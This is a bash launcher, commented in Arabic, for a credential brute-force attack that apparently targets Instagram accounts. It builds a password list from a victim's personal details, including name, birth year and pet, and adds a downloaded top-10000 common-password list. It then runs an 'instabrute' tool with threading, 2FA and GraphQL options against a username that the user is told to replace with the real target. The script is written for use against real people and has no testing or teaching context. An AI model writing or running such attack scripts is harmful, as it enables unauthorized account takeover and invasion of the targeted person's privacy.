#!/bin/bash

# ============================================================
# السكربت الأسطوري المتكامل - الميزات 1-8 دفعة واحدة
# ============================================================

echo "🔥 بدء التشغيل الأسطوري..."

# 1. قتل العمليات العالقة
echo "[*] تنظيف المنافذ..."
kill -9 $(lsof -t -i:8080) 2>/dev/null
kill -9 $(lsof -t -i:8081) 2>/dev/null
pkill -f flask 2>/dev/null
pkill -f instabrute 2>/dev/null
sleep 1

# 2. التحقق من وجود ملفات القوائم
echo "[*] تجهيز قوائم كلمات المرور..."

# توليد كلمات ذكية (إن لم توجد)
if [ ! -f "ai_gen.txt" ] || [ ! -s "ai_gen.txt" ]; then
    echo "[*] توليد كلمات مرور بالذكاء الاصطناعي (محلي)..."
    python ai_password_gen.py --name "real_username" --birth-year "1990" --pet "rocky" --hobby "coding" --count 500 --output ai_gen.txt
else
    echo "[✓] ai_gen.txt موجود"
fi

# تحميل قائمة كبيرة (إن لم توجد)
if [ ! -f "big_wordlist.txt" ] || [ ! -s "big_wordlist.txt" ]; then
    echo "[*] تحميل قائمة كبيرة (10000 كلمة)..."
    curl -L -o big_wordlist.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
else
    echo "[✓] big_wordlist.txt موجود"
fi

# دمج القوائم
echo "[*] دمج القوائم في ultimate_list.txt..."
cat ai_gen.txt big_wordlist.txt > ultimate_list.txt
TOTAL=$(wc -l < ultimate_list.txt)
echo "[✓] تم دمج $TOTAL كلمة مرور"

# 3. تحديد المستخدم المستهدف (غيّر هذا الاسم)
TARGET_USER="real_username"   # <--- غيّره إلى الاسم الحقيقي
echo "[*] المستهدف: $TARGET_USER"

# 4. تشغيل الهجوم بكل الميزات (1-8) على منفذ 8081 (حر)
echo "[*] إطلاق الهجوم الأسطوري..."
python instabrute_ultimate.py \
    --username "$TARGET_USER" \
    --password-file ultimate_list.txt \
    --threads 8 \
    --delay 2.0 \
    --smart \
    --graphql \
    --twofa \
    --web-port 8081 \
    --analysis

echo "[✓] انتهى السكربت."
